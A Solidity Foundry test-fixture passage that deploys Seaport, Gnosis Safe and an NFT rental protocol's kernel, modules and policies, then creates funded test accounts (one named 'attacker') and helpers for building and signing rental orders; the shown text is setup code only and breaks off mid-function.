{Create} from \"@src/policies/Create.sol\";\n    import {Stop} from \"@src/policies/Stop.sol\";\n    import {Factory} from \"@src/policies/Factory.sol\";\n    import {Admin} from \"@src/policies/Admin.sol\";\n    import {Guard} from \"@src/policies/Guard.sol\";\n    import {toRole} from \"@src/libraries/KernelUtils.sol\";\n    import {Proxy} from \"@src/proxy/Proxy.sol\";\n    import {Events} from \"@src/libraries/Events.sol\";\n    import {HandlerContext} from \"@safe-contracts/handler/HandlerContext.sol\";\n    import {CompatibilityFallbackHandler} from \"@safe-contracts/handler/CompatibilityFallbackHandler.sol\";\n\n    import {ISignatureValidator} from \"@safe-contracts/interfaces/ISignatureValidator.sol\";\n\n    import {ProtocolAccount} from \"@test/utils/Types.sol\";\n    import {MockERC20} from \"@test/mocks/tokens/standard/MockERC20.sol\";\n    import {MockERC721} from \"@test/mocks/tokens/standard/MockERC721.sol\";\n    import {MockERC1155} from \"@test/mocks/tokens/standard/MockERC1155.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import {ISafe} from \"@src/interfaces/ISafe.sol\";\n\n    import {Seaport} from \"@seaport-core/Seaport.sol\";\n    import {ConduitController} from \"@seaport-core/conduit/ConduitController.sol\";\n    import {ConduitControllerInterface} from \"@seaport-types/interfaces/ConduitControllerInterface.sol\";\n    import {ConduitInterface} from \"@seaport-types/interfaces/ConduitInterface.sol\";\n\n    import \"@forge-std/console.sol\";\n\n\n\n    // Deploys all Seaport protocol contracts\n    contract External_Seaport is Test {\n        // seaport protocol contracts\n        Seaport public seaport;\n        ConduitController public conduitController;\n        ConduitInterface public conduit;\n\n        // conduit owner and key\n        Vm.Wallet public conduitOwner;\n        bytes32 public conduitKey;\n\n        function setUp() public virtual {\n            // generate conduit owner wallet\n            conduitOwner = vm.createWallet(\"conduitOwner\");\n\n            // deploy conduit controller\n            conduitController = new ConduitController();\n\n            // deploy seaport\n            seaport = new Seaport(address(conduitController));\n\n            // create a conduit key (first 20 bytes must be conduit creator)\n            conduitKey = bytes32(uint256(uint160(conduitOwner.addr))) << 96;\n\n            // create a new conduit\n            vm.prank(conduitOwner.addr);\n            address conduitAddress = conduitController.createConduit(\n                conduitKey,\n                conduitOwner.addr\n            );\n\n            // set the conduit address\n            conduit = ConduitInterface(conduitAddress);\n\n            // open a channel for seaport on the conduit\n            vm.prank(conduitOwner.addr);\n            conduitController.updateChannel(address(conduit), address(seaport), true);\n\n            // label the contracts\n            vm.label(address(seaport), \"Seaport\");\n            vm.label(address(conduitController), \"ConduitController\");\n            vm.label(address(conduit), \"Conduit\");\n        }\n    }\n\n    // Deploys the Create2Deployer contract\n    contract External_Create2Deployer is Test {\n        Create2Deployer public create2Deployer;\n\n        function setUp() public virtual {\n            // Deploy the create2 deployer contract\n            create2Deployer = new Create2Deployer();\n\n            // label the contract\n            vm.label(address(create2Deployer), \"Create2Deployer\");\n        }\n    }\n\n    // Deploys all Gnosis Safe protocol contracts\n    contract External_Safe is Test {\n        SafeL2 public safeSingleton;\n        SafeProxyFactory public safeProxyFactory;\n\n        CompatibilityFallbackHandler public fallbackHandler;\n\n        function setUp() public virtual {\n            // Deploy safe singleton contract\n            safeSingleton = new SafeL2();\n\n            // Deploy safe proxy factory\n            safeProxyFactory = new SafeProxyFactory();\n\n            // Deploy the compatibility token handler\n            fallbackHandler = new CompatibilityFallbackHandler();\n\n            // Label the contracts\n            vm.label(address(safeSingleton), \"SafeSingleton\");\n            vm.label(address(safeProxyFactory), \"SafeProxyFactory\");\n            vm.label(address(fallbackHandler), \"TokenCallbackHandler\");\n        }\n    }\n\n    contract BaseExternal is External_Create2Deployer, External_Seaport, External_Safe {\n        // This is an explicit entrypoint for all external contracts that the V3 protocol depends on.\n        //\n        // It contains logic for:\n        // - setup of the Create2Deployer contract\n        // - setup of all Seaport protocol contracts\n        // - setup of all Gnosis Safe protocol contracts\n        //\n        // The inheritance chain is as follows:\n        // External_Create2Deployer + External_Seaport + External_Safe\n        // --> BaseExternal\n\n        function setUp()\n            public\n            virtual\n            override(External_Create2Deployer, External_Seaport, External_Safe)\n        {\n            // set up dependencies\n            External_Create2Deployer.setUp();\n            External_Seaport.setUp();\n            External_Safe.setUp();\n        }\n    }\n\n    // Deploys all V3 protocol contracts\n    contract Protocol is BaseExternal {\n        // Kernel\n        Kernel public kernel;\n\n        // Modules\n        Storage public STORE;\n        PaymentEscrow public ESCRW;\n\n        // Module implementation addresses\n        Storage public storageImplementation;\n        PaymentEscrow public paymentEscrowImplementation;\n\n        // Policies\n        Create public create;\n        Stop public stop;\n        Factory public factory;\n        Admin public admin;\n        Guard public guard;\n\n        // Protocol accounts\n        Vm.Wallet public rentalSigner;\n        Vm.Wallet public deployer;\n\n        // protocol constants\n        bytes12 public protocolVersion;\n        bytes32 public salt;\n\n        function _deployKernel() internal {\n            // abi encode the kernel bytecode and constructor arguments\n            bytes memory kernelInitCode = abi.encodePacked(\n                type(Kernel).creationCode,\n                abi.encode(deployer.addr, deployer.addr)\n            );\n\n            // Deploy kernel contract\n            vm.prank(deployer.addr);\n            kernel = Kernel(create2Deployer.deploy(salt, kernelInitCode));\n\n            // label the contract\n            vm.label(address(kernel), \"kernel\");\n        }\n\n        function _deployStorageModule() internal {\n            // abi encode the storage bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory storageImplementationInitCode = abi.encodePacked(\n                type(Storage).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy storage implementation contract\n            vm.prank(deployer.addr);\n            storageImplementation = Storage(\n                create2Deployer.deploy(salt, storageImplementationInitCode)\n            );\n\n            // abi encode the storage bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory storageProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(storageImplementation),\n                    abi.encodeWithSelector(\n                        Storage.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy storage proxy contract\n            vm.prank(deployer.addr);\n            STORE = Storage(create2Deployer.deploy(salt, storageProxyInitCode));\n\n            // label the contracts\n            vm.label(address(STORE), \"STORE\");\n            vm.label(address(storageImplementation), \"STORE_IMPLEMENTATION\");\n        }\n\n        function _deployPaymentEscrowModule() internal {\n            // abi encode the payment escrow bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory paymentEscrowImplementationInitCode = abi.encodePacked(\n                type(PaymentEscrow).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy payment escrow implementation contract\n            vm.prank(deployer.addr);\n            paymentEscrowImplementation = PaymentEscrow(\n                create2Deployer.deploy(salt, paymentEscrowImplementationInitCode)\n            );\n\n            // abi encode the payment escrow bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory paymentEscrowProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(paymentEscrowImplementation),\n                    abi.encodeWithSelector(\n                        PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy payment escrow contract\n            vm.prank(deployer.addr);\n            ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));\n\n            // label the contracts\n            vm.label(address(ESCRW), \"ESCRW\");\n            vm.label(address(paymentEscrowImplementation), \"ESCRW_IMPLEMENTATION\");\n        }\n\n        function _deployCreatePolicy() internal {\n            // abi encode the create policy bytecode and constructor arguments\n            bytes memory createInitCode = abi.encodePacked(\n                type(Create).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy create rental policy contract\n            vm.prank(deployer.addr);\n            create = Create(create2Deployer.deploy(salt, createInitCode));\n\n            // label the contract\n            vm.label(address(create), \"CreatePolicy\");\n        }\n\n        function _deployStopPolicy() internal {\n            // abi encode the stop policy bytecode and constructor arguments\n            bytes memory stopInitCode = abi.encodePacked(\n                type(Stop).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy stop rental policy contract\n            vm.prank(deployer.addr);\n            stop = Stop(create2Deployer.deploy(salt, stopInitCode));\n\n            // label the contract\n            vm.label(address(stop), \"StopPolicy\");\n        }\n\n        function _deployAdminPolicy() internal {\n            // abi encode the admin policy bytecode and constructor arguments\n            bytes memory adminInitCode = abi.encodePacked(\n                type(Admin).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy admin policy contract\n            vm.prank(deployer.addr);\n            admin = Admin(create2Deployer.deploy(salt, adminInitCode));\n\n            // label the contract\n            vm.label(address(admin), \"AdminPolicy\");\n        }\n\n        function _deployGuardPolicy() internal {\n            // abi encode the guard policy bytecode and constructor arguments\n            bytes memory guardInitCode = abi.encodePacked(\n                type(Guard).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy guard policy contract\n            vm.prank(deployer.addr);\n            guard = Guard(create2Deployer.deploy(salt, guardInitCode));\n\n            // label the contract\n            vm.label(address(guard), \"GuardPolicy\");\n        }\n\n        function _deployFactoryPolicy() internal {\n            // abi encode the factory policy bytecode and constructor arguments\n            bytes memory factoryInitCode = abi.encodePacked(\n                type(Factory).creationCode,\n                abi.encode(\n                    address(kernel),\n                    address(stop),\n                    address(guard),\n                    address(fallbackHandler),\n                    address(safeProxyFactory),\n                    address(safeSingleton)\n                )\n            );\n\n            // Deploy factory policy contract\n            vm.prank(deployer.addr);\n            factory = Factory(create2Deployer.deploy(salt, factoryInitCode));\n\n            // label the contract\n            vm.label(address(factory), \"FactoryPolicy\");\n        }\n\n        function _setupKernel() internal {\n            // Start impersonating the deployer\n            vm.startPrank(deployer.addr);\n\n            // Install modules\n            kernel.executeAction(Actions.InstallModule, address(STORE));\n            kernel.executeAction(Actions.InstallModule, address(ESCRW));\n\n            // Approve policies\n            kernel.executeAction(Actions.ActivatePolicy, address(create));\n            kernel.executeAction(Actions.ActivatePolicy, address(stop));\n            kernel.executeAction(Actions.ActivatePolicy, address(factory));\n            kernel.executeAction(Actions.ActivatePolicy, address(guard));\n            kernel.executeAction(Actions.ActivatePolicy, address(admin));\n\n            // Grant `seaport` role to seaport protocol\n            kernel.grantRole(toRole(\"SEAPORT\"), address(seaport));\n\n            // Grant `signer` role to the protocol signer to sign off on create payloads\n            kernel.grantRole(toRole(\"CREATE_SIGNER\"), rentalSigner.addr);\n\n            // Grant 'admin_admin` role to the address which can conduct admin operations on the protocol\n            kernel.grantRole(toRole(\"ADMIN_ADMIN\"), deployer.addr);\n\n            // Grant 'guard_admin` role to the address which can toggle hooks\n            kernel.grantRole(toRole(\"GUARD_ADMIN\"), deployer.addr);\n\n            // Grant `stop_admin` role to the address which can skim funds from the payment escrow\n            kernel.grantRole(toRole(\"STOP_ADMIN\"), deployer.addr);\n\n            // Stop impersonating the deployer\n            vm.stopPrank();\n        }\n\n        function setUp() public virtual override {\n            // setup dependencies\n            super.setUp();\n\n            // create the rental signer address and private key\n            rentalSigner = vm.createWallet(\"rentalSigner\");\n\n            // create the deployer address and private key\n            deployer = vm.createWallet(\"deployer\");\n\n            // contract salts (using 0x000000000000000000000100 to represent a version 1.0.0 of each contract)\n            protocolVersion = 0x000000000000000000000100;\n            salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);\n\n            // deploy kernel\n            _deployKernel();\n\n            // Deploy payment escrow\n            _deployPaymentEscrowModule();\n\n            // Deploy rental storage\n            _deployStorageModule();\n\n            // deploy create policy\n            _deployCreatePolicy();\n\n            // deploy stop policy\n            _deployStopPolicy();\n\n            // deploy admin policy\n            _deployAdminPolicy();\n\n            // Deploy guard policy\n            _deployGuardPolicy();\n\n            // deploy rental factory\n            _deployFactoryPolicy();\n\n            // intialize the kernel\n            _setupKernel();\n        }\n    }\n\n\n    // Creates test accounts to interact with the V3 protocol\n    // Borrowed from test/fixtures/protocol/AccountCreator\n    contract AccountCreator is Protocol {\n        // Protocol accounts for testing\n        ProtocolAccount public alice;\n        ProtocolAccount public bob;\n        ProtocolAccount public carol;\n        ProtocolAccount public dan;\n        ProtocolAccount public eve;\n        ProtocolAccount public attacker;\n\n        // Mock tokens for testing\n        MockERC20[] public erc20s;\n        MockERC721[] public erc721s;\n        MockERC1155[] public erc1155s;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // deploy 3 erc20 tokens, 3 erc721 tokens, and 3 erc1155 tokens\n            _deployTokens(3);\n\n            // instantiate all wallets and deploy rental safes for each\n            alice = _fundWalletAndDeployRentalSafe(\"alice\");\n            bob = _fundWalletAndDeployRentalSafe(\"bob\");\n            carol = _fundWalletAndDeployRentalSafe(\"carol\");\n            dan = _fundWalletAndDeployRentalSafe(\"dan\");\n            eve = _fundWalletAndDeployRentalSafe(\"eve\");\n            attacker = _fundWalletAndDeployRentalSafe(\"attacker\");\n\n\n\n        }\n\n        function _deployTokens(uint256 numTokens) internal {\n            for (uint256 i; i < numTokens; i++) {\n                _deployErc20Token();\n                _deployErc721Token();\n                _deployErc1155Token();\n            }\n        }\n\n        function _deployErc20Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc20s.length;\n\n            // deploy the mock token\n            MockERC20 token = new MockERC20();\n\n            // push the token to the array of mocks\n            erc20s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC20_\", LibString.toString(i)));\n        }\n\n        function _deployErc721Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc721s.length;\n\n            // deploy the mock token\n            MockERC721 token = new MockERC721();\n\n            // push the token to the array of mocks\n            erc721s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC721_\", LibString.toString(i)));\n        }\n\n        function _deployErc1155Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc1155s.length;\n\n            // deploy the mock token\n            MockERC1155 token = new MockERC1155();\n\n            // push the token to the array of mocks\n            erc1155s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC1155_\", LibString.toString(i)));\n        }\n\n        function _deployRentalSafe(\n            address owner,\n            string memory name\n        ) internal returns (address safe) {\n            // Deploy a 1/1 rental safe\n            address[] memory owners = new address[](1);\n            owners[0] = owner;\n            safe = factory.deployRentalSafe(owners, 1);\n\n\n\n        }\n\n        function _fundWalletAndDeployRentalSafe(\n            string memory name\n        ) internal returns (ProtocolAccount memory account) {\n            // create a wallet with a address, public key, and private key\n            Vm.Wallet memory wallet = vm.createWallet(name);\n\n            // deploy a rental safe for the address\n            address rentalSafe = _deployRentalSafe(wallet.addr, name);\n\n            // fund the wallet with ether, all erc20s, and approve the conduit for erc20s, erc721s, erc1155s\n            _allocateTokensAndApprovals(wallet.addr, 10000);\n\n            // create an account\n            account = ProtocolAccount({\n                addr: wallet.addr,\n                safe: SafeL2(payable(rentalSafe)),\n                publicKeyX: wallet.publicKeyX,\n                publicKeyY: wallet.publicKeyY,\n                privateKey: wallet.privateKey\n            });\n\n        }\n\n        function _allocateTokensAndApprovals(address to, uint128 amount) internal {\n            // deal ether to the recipient\n            vm.deal(to, amount);\n\n            // mint all erc20 tokens to the recipient\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].mint(to, amount);\n            }\n\n            // set token approvals\n            _setApprovals(to);\n        }\n\n        function _setApprovals(address owner) internal {\n            // impersonate the owner address\n            vm.startPrank(owner);\n\n            // set all approvals for erc20 tokens\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].approve(address(conduit), type(uint256).max);\n            }\n\n            // set all approvals for erc721 tokens\n            for (uint256 i = 0; i < erc721s.length; ++i) {\n                erc721s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // set all approvals for erc1155 tokens\n            for (uint256 i = 0; i < erc1155s.length; ++i) {\n                erc1155s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // stop impersonating\n            vm.stopPrank();\n        }\n    }\n\n\n    // Sets up logic in the test engine related to order creation\n    // Borrowed from test/fixtures/engine/OrderCreator\n    contract OrderCreator is AccountCreator {\n        using OfferItemLib for OfferItem;\n        using ConsiderationItemLib for ConsiderationItem;\n        using OrderComponentsLib for OrderComponents;\n        using OrderLib for Order;\n        using ECDSA for bytes32;\n\n        // defines a config for a standard order component\n        string constant STANDARD_ORDER_COMPONENTS = \"standard_order_components\";\n\n        struct OrderToCreate {\n            ProtocolAccount offerer;\n            OfferItem[] offerItems;\n            ConsiderationItem[] considerationItems;\n            OrderMetadata metadata;\n        }\n\n        // keeps track of tokens used during a test\n        uint256[] usedOfferERC721s;\n        uint256[] usedOfferERC1155s;\n\n        uint256[] usedConsiderationERC721s;\n        uint256[] usedConsiderationERC1155s;\n\n        // components of an order\n        OrderToCreate orderToCreate;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // Define a standard OrderComponents struct which is ready for\n            // use with the Create Policy and the protocol conduit contract\n            OrderComponentsLib\n                .empty()\n                .withOrderType(SeaportOrderType.FULL_RESTRICTED)\n                .withZone(address(create))\n                .withStartTime(block.timestamp)\n                .withEndTime(block.timestamp + 100)\n                .withSalt(123456789)\n                .withConduitKey(conduitKey)\n                .saveDefault(STANDARD_ORDER_COMPONENTS);\n\n            // for each test token, create a storage slot\n            for (uint256 i = 0; i < erc721s.length; i++) {\n                usedOfferERC721s.push();\n                usedConsiderationERC721s.push();\n\n                usedOfferERC1155s.push();\n                usedConsiderationERC1155s.push();\n            }\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                                Order Creation                               //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order based on the provided context. The defaults on this order\n        // are good for most test cases.\n        function createOrder(\n            ProtocolAccount memory offerer,\n            OrderType orderType,\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers,\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) internal {\n            // require that the number of offer items or consideration items\n            // dont exceed the number of test tokens\n            require(\n                erc721Offers <= erc721s.length &&\n                    erc721Offers <= erc1155s.length &&\n                    erc20Offers <= erc20s.length,\n                \"TEST: too many offer items defined\"\n            );\n            require(\n                erc721Considerations <= erc721s.length &&\n                    erc1155Considerations <= erc1155s.length &&\n                    erc20Considerations <= erc20s.length,\n                \"TEST: too many consideration items defined\"\n            );\n\n            // create the offerer\n            _createOfferer(offerer);\n\n            // add the offer items\n            _createOfferItems(erc721Offers, erc1155Offers, erc20Offers);\n\n            // create the consideration items\n            _createConsiderationItems(\n                erc721Considerations,\n                erc1155Considerations,\n                erc20Considerations\n            );\n\n            // Create order metadata\n            _createOrderMetadata(orderType);\n        }\n\n        // Creates an offerer on the order to create\n        function _createOfferer(ProtocolAccount memory offerer) private {\n            orderToCreate.offerer = offerer;\n        }\n\n        // Creates offer items which are good for most tests\n        function _createOfferItems(\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers\n        ) private {\n            // generate the ERC721 offer items\n            for (uint256 i = 0; i < erc721Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // mint an erc721 to the offerer\n                erc721s[i].mint(orderToCreate.offerer.addr);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC721s[i]++;\n            }\n\n            // generate the ERC1155 offer items\n            for (uint256 i = 0; i < erc1155Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // mint an erc1155 to the offerer\n                erc1155s[i].mint(orderToCreate.offerer.addr, 100);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC1155s[i]++;\n            }\n\n            // generate the ERC20 offer items\n            for (uint256 i = 0; i < erc20Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates consideration items that are good for most tests\n        function _createConsiderationItems(\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) private {\n            // generate the ERC721 consideration items\n            for (uint256 i = 0; i < erc721Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC721s[i]++;\n            }\n\n            // generate the ERC1155 consideration items\n            for (uint256 i = 0; i < erc1155Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC1155s[i]++;\n            }\n\n            // generate the ERC20 consideration items\n            for (uint256 i = 0; i < erc20Considerations; ++i) {\n                // create the offer item\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(ESCRW))\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates a order metadata that is good for most tests\n        function _createOrderMetadata(OrderType orderType) private {\n            // Create order metadata\n            orderToCreate.metadata.orderType = orderType;\n            orderToCreate.metadata.rentDuration = 500;\n            orderToCreate.metadata.emittedExtraData = new bytes(0);\n        }\n\n        // creates a signed seaport order ready to be fulfilled by a renter\n        function _createSignedOrder(\n            ProtocolAccount memory _offerer,\n            OfferItem[] memory _offerItems,\n            ConsiderationItem[] memory _considerationItems,\n            OrderMetadata memory _metadata\n        ) private view returns (Order memory order, bytes32 orderHash) {\n            // Build the order components\n            OrderComponents memory orderComponents = OrderComponentsLib\n                .fromDefault(STANDARD_ORDER_COMPONENTS)\n                .withOfferer(_offerer.addr)\n                .withOffer(_offerItems)\n                .withConsideration(_considerationItems)\n                .withZoneHash(create.getOrderMetadataHash(_metadata))\n                .withCounter(seaport.getCounter(_offerer.addr));\n\n            // generate the order hash\n            orderHash = seaport.getOrderHash(orderComponents);\n\n            // generate the signature for the order components\n            bytes memory signature = _signSeaportOrder(_offerer.privateKey, orderHash);\n\n            // create the order, but dont provide a signature if its a PAYEE order.\n            // Since PAYEE orders are fulfilled by the offerer of the order, they\n            // dont need a signature.\n            if (_metadata.orderType == OrderType.PAYEE) {\n                order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());\n            } else {\n                order = OrderLib\n                    .empty()\n                    .withParameters(orderComponents.toOrderParameters())\n                    .withSignature(signature);\n            }\n        }\n\n        function _signSeaportOrder(\n            uint256 signerPrivateKey,\n            bytes32 orderHash\n        ) private view returns (bytes memory signature) {\n            // fetch domain separator from seaport\n            (, bytes32 domainSeparator, ) = seaport.information();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(orderHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                               Order Amendments                              //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function resetOrderToCreate() internal {\n            delete orderToCreate;\n        }\n\n        function withOfferer(ProtocolAccount memory _offerer) internal {\n            orderToCreate.offerer = _offerer;\n        }\n\n        function resetOfferer() internal {\n            delete orderToCreate.offerer;\n        }\n\n        function withReplacedOfferItems(OfferItem[] memory _offerItems) internal {\n            // reset all current offer items\n            resetOfferItems();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < _offerItems.length; i++) {\n                orderToCreate.offerItems.push(_offerItems[i]);\n            }\n        }\n\n        function withOfferItem(OfferItem memory offerItem) internal {\n            orderToCreate.offerItems.push(offerItem);\n        }\n\n        function resetOfferItems() internal {\n            delete orderToCreate.offerItems;\n        }\n\n        function popOfferItem() internal {\n            orderToCreate.offerItems.pop();\n        }\n\n        function withReplacedConsiderationItems(\n            ConsiderationItem[] memory _considerationItems\n        ) internal {\n            // reset all current consideration items\n            resetConsiderationItems();\n\n            // add the new consideration items to storage\n            for (uint256 i = 0; i < _considerationItems.length; i++) {\n                orderToCreate.considerationItems.push(_considerationItems[i]);\n            }\n        }\n\n        function withConsiderationItem(ConsiderationItem memory considerationItem) internal {\n            orderToCreate.considerationItems.push(considerationItem);\n        }\n\n        function resetConsiderationItems() internal {\n            delete orderToCreate.considerationItems;\n        }\n\n        function popConsiderationItem() internal {\n            orderToCreate.considerationItems.pop();\n        }\n\n        function withHooks(Hook[] memory hooks) internal {\n            // delete the current metatdata hooks\n            delete orderToCreate.metadata.hooks;\n\n            // add each metadata hook to storage\n            for (uint256 i = 0; i < hooks.length; i++) {\n                orderToCreate.metadata.hooks.push(hooks[i]);\n            }\n        }\n\n        function withOrderMetadata(OrderMetadata memory _metadata) internal {\n            // update the static metadata parameters\n            orderToCreate.metadata.orderType = _metadata.orderType;\n            orderToCreate.metadata.rentDuration = _metadata.rentDuration;\n            orderToCreate.metadata.emittedExtraData = _metadata.emittedExtraData;\n\n            // update the hooks\n            withHooks(_metadata.hooks);\n        }\n\n        function resetOrderMetadata() internal {\n            delete orderToCreate.metadata;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                              Order Finalization                             //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function finalizeOrder()\n            internal\n            returns (Order memory, bytes32, OrderMetadata memory)\n        {\n            // create and sign the order\n            (Order memory order, bytes32 orderHash) = _createSignedOrder(\n                orderToCreate.offerer,\n                orderToCreate.offerItems,\n                orderToCreate.considerationItems,\n                orderToCreate.metadata\n            );\n\n            // pull order metadata into memory\n            OrderMetadata memory metadata = orderToCreate.metadata;\n\n            // clear structs\n            resetOrderToCreate();\n\n            return (order, orderHash, metadata);\n        }\n    }\n\n\n    // Sets up logic in the test engine related to order fulfillment\n    // Borrowed from test/fixtures/engine/OrderFulfiller\n    contract OrderFulfiller is OrderCreator {\n        using ECDSA for bytes32;\n\n        struct OrderToFulfill {\n            bytes32 orderHash;\n            RentPayload payload;\n            AdvancedOrder advancedOrder;\n        }\n\n        // components of a fulfillment\n        ProtocolAccount fulfiller;\n        OrderToFulfill[] ordersToFulfill;\n        Fulfillment[] seaportMatchOrderFulfillments;\n        FulfillmentComponent[][] seaportOfferFulfillments;\n        FulfillmentComponent[][] seaportConsiderationFulfillments;\n        address seaportRecipient;\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                             Fulfillment Creation                            //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order fulfillment\n        function createOrderFulfillment(\n            ProtocolAccount memory _fulfiller,\n            Order memory order,\n            bytes32 orderHash,\n            OrderMetadata memory metadata\n        ) internal {\n            // set the fulfiller account\n            fulfiller = _fulfiller;\n\n            // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via\n            // `matchAdvancedOrders`, then any unspent offer items will go to this address as well\n            seaportRecipient = address(_fulfiller.safe);\n\n            // get a pointer to a new order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill.push();\n\n            // create an order fulfillment\n            OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));\n\n            // add the order hash and fulfiller\n            orderToFulfill.orderHash = orderHash;\n\n            // create rental zone payload data\n            _createRentalPayload(\n                orderToFulfill.payload,\n                RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)\n            );\n\n            // generate the signature for the payload\n            bytes memory signature = _signProtocolOrder(\n                rentalSigner.privateKey,\n                create.getRentPayloadHash(orderToFulfill.payload)\n            );\n\n            // create an advanced order from the order. Pass the rental\n            // payload as extra data\n            _createAdvancedOrder(\n                orderToFulfill.advancedOrder,\n                AdvancedOrder(\n                    order.parameters,\n                    1,\n                    1,\n                    order.signature,\n                    abi.encode(orderToFulfill.payload, signature)\n                )\n            );\n        }\n\n        function _createOrderFulfiller(\n            ProtocolAccount storage storageFulfiller,\n            ProtocolAccount memory _fulfiller\n        ) private {\n            storageFulfiller.addr = _fulfiller.addr;\n            storageFulfiller.safe = _fulfiller.safe;\n            storageFulfiller.publicKeyX = _fulfiller.publicKeyX;\n            storageFulfiller.publicKeyY = _fulfiller.publicKeyY;\n            storageFulfiller.privateKey = _fulfiller.privateKey;\n        }\n\n        function _createOrderFulfillment(\n            OrderFulfillment storage storageFulfillment,\n            OrderFulfillment memory fulfillment\n        ) private {\n            storageFulfillment.recipient = fulfillment.recipient;\n        }\n\n        function _createOrderMetadata(\n            OrderMetadata storage storageMetadata,\n            OrderMetadata memory metadata\n        ) private {\n            // Create order metadata in storage\n            storageMetadata.orderType = metadata.orderType;\n            storageMetadata.rentDuration = metadata.rentDuration;\n            storageMetadata.emittedExtraData = metadata.emittedExtraData;\n\n            // dynamically push the hooks from memory to storage\n            for (uint256 i = 0; i < metadata.hooks.length; i++) {\n                